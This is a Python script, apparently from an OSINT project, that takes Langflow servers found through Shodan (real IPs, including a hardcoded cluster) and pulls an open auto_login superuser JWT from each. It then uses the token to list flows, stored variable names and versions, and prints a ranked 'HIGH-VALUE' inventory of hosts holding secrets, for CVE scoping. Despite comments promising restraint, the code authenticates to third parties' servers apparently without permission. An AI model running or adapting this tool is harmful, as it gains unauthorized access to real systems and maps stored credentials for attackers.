#!/usr/bin/env python3
"""
Cat-Langflow Stage 3v DEEP — restraint-bounded.
For each confirmed IP: pull auto_login JWT, version-scope for CVE exposure,
map data surface as NAMES + COUNTS only. NEVER dump flow bodies or variable values.
Honeypot-cluster IPs: test whether the JWT actually authenticates a real flow API
(honeypot discriminator — canned health_check vs working backend).
"""
import asyncio, aiohttp, json, ssl
from collections import defaultdict

TIMEOUT = 10
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Load verify results, dedupe to best port per IP
with open("/home/cowboy/AI-LLM-Infrastructure-OSINT/shodan/cat-langflow-2026-06-18/verify-results.json") as f:
    verify = json.load(f)

ip_ports = defaultdict(list)
for e in verify:
    ip_ports[e['ip']].append(e['port'])

CLUSTER = {'101.200.142.223','101.200.156.251','104.237.139.130','112.126.76.30','8.211.200.183'}

def best_port(ports):
    for pref in (7860, 443, 80, 3000, 8080, 8000, 3001, 8060):
        if pref in ports:
            return pref
    return ports[0]

targets = {ip: best_port(ports) for ip, ports in ip_ports.items()}

def url(ip, port, path):
    scheme = "https" if port == 443 else "http"
    return f"{scheme}://{ip}:{port}{path}"

async def get(session, u, headers=None):
    try:
        async with session.get(u, ssl=ctx, headers=headers or {},
                               timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            body = await r.text()
            return r.status, body
    except Exception as e:
        return None, str(e)[:120]

async def collect(session, ip, port):
    res = {"ip": ip, "port": port, "in_cluster": ip in CLUSTER,
           "version": None, "auth_open": False, "jwt_works": False,
           "flow_count": None, "flow_names": [], "var_count": None,
           "var_names": [], "config_keys": [], "endpoints": {}}

    # 1. auto_login -> JWT (open-superuser confirm)
    st, body = await get(session, url(ip, port, "/api/v1/auto_login"))
    res["endpoints"]["auto_login"] = st
    token = None
    if st == 200 and "access_token" in body:
        res["auth_open"] = True
        try:
            token = json.loads(body).get("access_token")
        except Exception:
            pass
    hdr = {"Authorization": f"Bearer {token}"} if token else {}

    # 2. version scoping (try unauth, then with token)
    for path in ("/api/v1/version",):
        st, body = await get(session, url(ip, port, path), hdr)
        res["endpoints"]["version"] = st
        if st == 200 and "ersion" in body:
            try:
                d = json.loads(body)
                res["version"] = d.get("version") or d.get("main_version")
                res["package"] = d.get("package")
            except Exception:
                pass

    # 3. config (langflow_version + feature flags — keys only, restraint)
    st, body = await get(session, url(ip, port, "/api/v1/config"), hdr)
    res["endpoints"]["config"] = st
    if st == 200:
        try:
            d = json.loads(body)
            res["config_keys"] = sorted(d.keys())
            if not res["version"]:
                res["version"] = d.get("langflow_version") or d.get("version")
        except Exception:
            pass

    # 4. flows — NAMES + COUNT ONLY (restraint: strip data field, never dump bodies)
    st, body = await get(session, url(ip, port, "/api/v1/flows/?remove_example_flows=true&header_flows=true"), hdr)
    res["endpoints"]["flows"] = st
    if st == 200:
        try:
            d = json.loads(body)
            flows = d if isinstance(d, list) else d.get("flows", [])
            res["flow_count"] = len(flows)
            res["flow_names"] = [f.get("name", "?") for f in flows][:40]  # names only
            res["jwt_works"] = True  # authenticated flow read succeeded
        except Exception:
            pass

    # 5. variables — NAMES + TYPE ONLY (key inventory; NEVER read values)
    st, body = await get(session, url(ip, port, "/api/v1/variables/"), hdr)
    res["endpoints"]["variables"] = st
    if st == 200:
        try:
            d = json.loads(body)
            vs = d if isinstance(d, list) else d.get("variables", [])
            res["var_count"] = len(vs)
            res["var_names"] = [{"name": v.get("name", "?"), "type": v.get("type", "?")}
                                for v in vs][:40]  # names+types, no values
        except Exception:
            pass

    # 6. monitor/messages — accessibility check ONLY (count, never content)
    st, _ = await get(session, url(ip, port, "/api/v1/monitor/messages"), hdr)
    res["endpoints"]["monitor_messages"] = st

    return res

async def main():
    conn = aiohttp.TCPConnector(limit=30, ssl=ctx)
    async with aiohttp.ClientSession(connector=conn) as session:
        tasks = [collect(session, ip, port) for ip, port in targets.items()]
        results = await asyncio.gather(*tasks, return_exceptions=True)

    out = [r for r in results if isinstance(r, dict)]
    with open("/home/cowboy/AI-LLM-Infrastructure-OSINT/shodan/cat-langflow-2026-06-18/deep-collect.json", "w") as f:
        json.dump(out, f, indent=2)

    # Summary
    versioned = [r for r in out if r["version"]]
    jwt_works = [r for r in out if r["jwt_works"]]
    cluster = [r for r in out if r["in_cluster"]]
    cluster_jwt = [r for r in cluster if r["jwt_works"]]
    with_flows = [r for r in out if r["flow_count"]]
    with_vars = [r for r in out if r["var_count"]]

    print(f"Targets (deduped IPs): {len(out)}")
    print(f"Version resolved:      {len(versioned)}")
    print(f"JWT authenticated flow API (real backend): {len(jwt_works)}")
    print(f"Cluster IPs: {len(cluster)} | of which JWT-works: {len(cluster_jwt)}")
    print(f"IPs with >=1 flow:     {len(with_flows)}")
    print(f"IPs with >=1 variable (key inventory): {len(with_vars)}")
    print()
    print("=== VERSION DISTRIBUTION (CVE scoping) ===")
    vd = defaultdict(int)
    for r in versioned:
        vd[r["version"]] += 1
    for v, c in sorted(vd.items(), key=lambda x: -x[1]):
        print(f"  {v}: {c}")
    print()
    print("=== CLUSTER JWT-DISCRIMINATOR (honeypot test) ===")
    for r in cluster:
        print(f"  {r['ip']}:{r['port']} | version={r['version']} | jwt_works={r['jwt_works']} | flows={r['flow_count']} | vars={r['var_count']}")
    print()
    print("=== HIGH-VALUE: IPs with variables (stored key inventory) ===")
    for r in sorted(with_vars, key=lambda x: -(x['var_count'] or 0)):
        names = ", ".join(v["name"] for v in r["var_names"][:8])
        print(f"  {r['ip']}:{r['port']} | {r['var_count']} vars | flows={r['flow_count']} | ver={r['version']}")
        print(f"      var names: {names}")

asyncio.run(main())
